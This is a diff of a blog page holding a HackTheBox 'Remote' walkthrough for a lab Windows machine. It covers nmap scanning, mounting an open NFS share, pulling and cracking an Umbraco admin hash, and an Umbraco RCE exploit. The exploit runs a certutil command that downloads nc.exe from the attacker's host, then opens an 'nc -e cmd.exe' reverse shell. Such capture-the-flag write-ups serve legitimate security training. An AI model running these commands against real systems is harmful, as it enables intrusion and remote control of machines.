@@ -1,106 +1,100 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Remote Write Up w/o Metasploit - AJDIN</title><link rel="icon" type="image/png" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta property="og:title" content="HackTheBox Remote Write Up w/o Metasploit" />
-<meta property="og:description" content="This is an easy Windows box by mrb3n. For initial foothold we need to find and crack creds found in NFS and use them in an exploit so we can get RCE." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://ajdin.io/posts/htb/remote/" />
-<meta property="article:published_time" content="2020-08-18T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-08-18T00:00:00+00:00" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HackTheBox Remote Write Up w/o Metasploit"/>
-<meta name="twitter:description" content="This is an easy Windows box by mrb3n. For initial foothold we need to find and crack creds found in NFS and use them in an exploit so we can get RCE."/>
-<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
-
-	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/normalize.css" />
-	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://ajdin.io/css/dark.css"  />
-
-	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
-	<script src="https://ajdin.io/js/main.js"></script>
-	<script src="https://ajdin.io/cookieconsent.js"></script>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Vollkorn:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    
+    
+    <title>HackTheBox Remote Write Up w/o Metasploit | Ajdin&#39;s blog</title>
 </head>
-
 <body>
-	<div class="container wrapper post">
-		<div id="cookies-eu-banner" style="display: none;" >
-    	By continuing to visit this site, you accept the use of anonymized cookies for analytics.
-	<a href="https://ajdin.io/privacy" id="cookies-eu-more">Read more</a>.
-	
-	<button id="cookies-eu-accept"><a>Accept</a></button>
+        <div class="container"><div id="header">
+    <div id="header-top">
+        <div id="header-left">
+            <a href="/" class="link-fix">
+            <h1 class="title"> Ajdin&#39;s blog</h1>
+            <h3 class="handle">@ajdintrejic</h3>
+            </a>
+        </div>
+        <div id="header-right">
+            
+            
+            
+             
+            
+              <a class="social-icons__link" rel="me" title="Twitter"
+                 href="https://twitter.com/ajdintrejic"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="twitter"></i>
+        
+              </a>
+            
+          
+             
+            
+              <a class="social-icons__link" rel="me" title="GitHub"
+                 href="https://github.com/ajdintrejic"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="github"></i>
+        
+              </a>
+            
+          
+             
+            
+              <a class="social-icons__link" rel="me" title="RSS"
+                 href="/index.xml"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="rss"></i>
+        
+              </a>
+            
+             
+        </div>
+    </div>
+    <div class="nav-bar">
+        
+        <a class="nav-item link-fix" href="/">
+                
+                Home
+        </a>
+        
+        <a class="nav-item link-fix" href="/about">
+                
+                About
+        </a>
+        
+        <a class="nav-item link-fix" href="/tags">
+                
+                Tags
+        </a>
+        
+    </div>
 </div>
-<div class="header">
-	<base href="https://ajdin.io/">
+
+<div id="content">
+<h2 class="post-title">HackTheBox Remote Write Up w/o Metasploit</h2>
 
 
 
-	<h1 class="site-title"><a href="https://ajdin.io/">AJDIN</a></h1>
-	<div class="site-description"><h2>ajdin.io</h2><nav class="nav social">
-			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
-		</nav>
-	</div>
-
-	<nav class="nav">
-		<ul class="flat">
-			
-			<li>
-				<a href="/">Home</a>
-			</li>
-			
-			<li>
-				<a href="/posts">Archive</a>
-			</li>
-			
-			<li>
-				<a href="/about">About</a>
-			</li>
-			
-			<li>
-				<a href="/tags">Tags</a>
-			</li>
-			
-		</ul>
-	</nav>
-</div>
+<div class="date">Aug 18, 2020</div>
 
 
-		<div class="post-header">
-			<h1 class="title">HackTheBox Remote Write Up w/o Metasploit</h1>
-			<div class="meta">Posted at &mdash; Aug 18, 2020</div>
-		</div>
 
-		
-		<div class="toc">              
-			<h3>Table of Contents</h3>
-			<nav id="TableOfContents">
-  <ul>
-    <li><a href="https://ajdin.io/posts/htb/remote/#getting-a-reverse-shell">Getting a reverse shell</a></li>
-  </ul>
+<br/>
 
-  <ul>
-    <li><a href="https://ajdin.io/posts/htb/remote/#privilege-escalation">Privilege escalation</a></li>
-  </ul>
-</nav>
-			<hr>
-		</div>              
-		
-		</aside>              
-
-		<div class="markdown">
-              		
 <p>This is an <strong>easy</strong> Windows box by <strong>mrb3n</strong>. For initial foothold we need to find and crack creds found in NFS and use them in an exploit so we can get RCE. After that we need PowerUp.ps1 powershell script to exploit a Windows Service so we can elevate privileges to nt authority\system. If you have any questions you can find me on Twitter @ajdintrejic.</p>
 <h1 id="reconnaissance">Reconnaissance</h1>
 <p>Let’s do a quick nmap scan.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nmap -sC -sV -O -oA nmap/initial 10.10.10.180
-</code></pre></td></tr></table>
-</div>
-</div><p>Quick explanation:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nmap -sC -sV -O -oA nmap/initial 10.10.10.180
+</code></pre></div><p>Quick explanation:</p>
 <ul>
 <li>-sC: run default script scan</li>
 <li>-sV: probe open ports to determine service/version info</li>
@@ -108,60 +102,7 @@
 <li>oA: output OS detection, version detection, script scanning, and traceroute</li>
 </ul>
 <p>Results:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">## nmapNmap scan report for 10.10.10.180 (10.10.10.180)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">## nmapNmap scan report for 10.10.10.180 (10.10.10.180)
 Host is up (1.0s latency).
 Not shown: 993 closed ports
 PORT     STATE SERVICE       VERSION
@@ -210,9 +151,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
 |   date: 2020-07-13T14:30:50
 |_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 635.59 seconds
-</code></pre></td></tr></table>
-</div>
-</div><p>A quick look at the ports:</p>
+</code></pre></div><p>A quick look at the ports:</p>
 <ul>
 <li>port 21: a FTP port</li>
 <li>port 80: http server running on Microsoft Server</li>
@@ -243,36 +182,13 @@ root@mylo:~# showmount -h
 root@mylo:~# showmount -e %ipaddrs</p>
 </blockquote>
 <p>Connecting without an username and password is not possible on this box, so I tried mounting <strong>nfs</strong>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/htb/remote/nfs
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/htb/remote/nfs
 [sudo] password for kali: 
 kali@kali:~/htb/remote$ cd nfs
 kali@kali:~/htb/remote/nfs$ ls
 App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
-</code></pre></td></tr></table>
-</div>
-</div><p>Boom, we got some info, after enumerating I found a file called <code>Umbraco.sdf</code> which unfortunately can’t be opened on Linux, I tried converting it to other types of formats with some online tools but none of them worked. But here comes the knowledge of other CTFs into play. We can search for strings in the file with an Unix tool called strings. The output is kinda big so I piped it to less.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">strings Umbraco.sdf | less[...]
+</code></pre></div><p>Boom, we got some info, after enumerating I found a file called <code>Umbraco.sdf</code> which unfortunately can’t be opened on Linux, I tried converting it to other types of formats with some online tools but none of them worked. But here comes the knowledge of other CTFs into play. We can search for strings in the file with an Unix tool called strings. The output is kinda big so I piped it to less.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">strings Umbraco.sdf | less[...]
 Administrator admin b8be16afba8c314ad33d812f22a04991b90e2aaa {&#34;hashAlgorithm&#34;:&#34;SHA1&#34;} en-US f8512f97-cab1-4a4b-a49f-0a2054c47a1d
 admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa {&#34;hashAlgorithm&#34;:&#34;SHA1&#34;} admin@htb.local en-US feb1a998-d3bf-406a-b30b-e269d7abdf50
 admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa {&#34;hashAlgorithm&#34;:&#34;SHA1&#34;} admin@htb.local en-US82756c26-4321-4d27-b429-1b5c7c4f882f
@@ -280,20 +196,11 @@ smith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTp
 ssmith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;} smith@htb.local en-US 7e39df83-5e64-4b93-9702-ae257a9b9749
 ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA= {&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;} ssmith@htb.local en-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 [...]
-</code></pre></td></tr></table>
-</div>
-</div><p>This could have also been found with <code>strings Umbraco.sdf | grep -i hash</code>, and you could have replaced <code>hash</code> with something like <code>password</code>, <code>sha</code>, <code>admin</code>, etc.</p>
+</code></pre></div><p>This could have also been found with <code>strings Umbraco.sdf | grep -i hash</code>, and you could have replaced <code>hash</code> with something like <code>password</code>, <code>sha</code>, <code>admin</code>, etc.</p>
 <p>The other hashes I coudn’t crack but I cracked the admin one.</p>
 <p><img src="/htb/remote/4.png" alt=""></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:baconandcheese
-</code></pre></td></tr></table>
-</div>
-</div><p>Now we got the creds, let’s try to login.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:baconandcheese
+</code></pre></div><p>Now we got the creds, let’s try to login.</p>
 <p><img src="/images/htb/remote/5.png" alt=""></p>
 <p>Inside of this CMS we can’t do anything except run that exploit I found before: Umraco Reverse Code Execution.</p>
 <h2 id="getting-a-reverse-shell">Getting a reverse shell<a class="anchor" href="#getting-a-reverse-shell">#</a></h2>
@@ -301,131 +208,43 @@ ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtF
 <ol>
 <li>Start a local python server for transfering nc.exe:</li>
 </ol>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Downloads/netcat-1.11$ sudo python3 -m http.server 101
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Downloads/netcat-1.11$ sudo python3 -m http.server 101
 [sudo] password for kali: 
 Serving HTTP on 0.0.0.0 port 101 (http://0.0.0.0:101/) ...
 10.10.10.180 - - [14/Jul/2020 12:40:15] &#34;GET /nc.exe HTTP/1.1&#34; 200 -
 10.10.10.180 - - [14/Jul/2020 12:40:15] &#34;GET /nc.exe HTTP/1.1&#34; 200 -
-</code></pre></td></tr></table>
-</div>
-</div><ol start="2">
+</code></pre></div><ol start="2">
 <li>Grab it from the box using the exploit:</li>
 </ol>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180/&#39; -c powershell.exe -a &#39;-NoProfile -Command certutil -urlcache -split -f http://10.10.14.243:101/nc.exe c:/windows/temp/nc.exe&#39;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180/&#39; -c powershell.exe -a &#39;-NoProfile -Command certutil -urlcache -split -f http://10.10.14.243:101/nc.exe c:/windows/temp/nc.exe&#39;
 ****  Online  ****
   0000  ...
   8eb0
 CertUtil: -URLCache command completed successfully.
-</code></pre></td></tr></table>
-</div>
-</div><ol start="3">
+</code></pre></div><ol start="3">
 <li>Start a reverse shell listener on your local machine:</li>
 </ol>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 102
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 102
 [sudo] password for kali: 
 listening on [any] 102 ...
-</code></pre></td></tr></table>
-</div>
-</div><ol start="4">
+</code></pre></div><ol start="4">
 <li>Execute nc to connect back to you</li>
 </ol>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180/&#39; -c powershell.exe -a &#39;-NoProfile -Command c:/windows/temp/nc.exe 10.10.14.243 102 -e cmd.exe&#39;
-</code></pre></td></tr></table>
-</div>
-</div><p>After that we should gain a connection on our reverse shell listener:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 102
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180/&#39; -c powershell.exe -a &#39;-NoProfile -Command c:/windows/temp/nc.exe 10.10.14.243 102 -e cmd.exe&#39;
+</code></pre></div><p>After that we should gain a connection on our reverse shell listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 102
 [sudo] password for kali: 
 listening on [any] 102 ...
 connect to [10.10.14.243] from (UNKNOWN) [10.10.10.180] 49744
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.C:\windows\system32\inetsrv&gt;
-</code></pre></td></tr></table>
-</div>
-</div><p><img src="/images/htb/remote/1.gif" alt=""></p>
+</code></pre></div><p><img src="/images/htb/remote/1.gif" alt=""></p>
 <p>And this is how I got user flag.</p>
 <hr>
 <h1 id="getting-nt-authoritysystem-root">Getting nt authority\system (root)</h1>
 <h2 id="privilege-escalation">Privilege escalation<a class="anchor" href="#privilege-escalation">#</a></h2>
 <p>I transfered winPEAS.exe on the machine to <code>C:\Windows\Temp</code>. When I ran it, it found multiple exploits.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
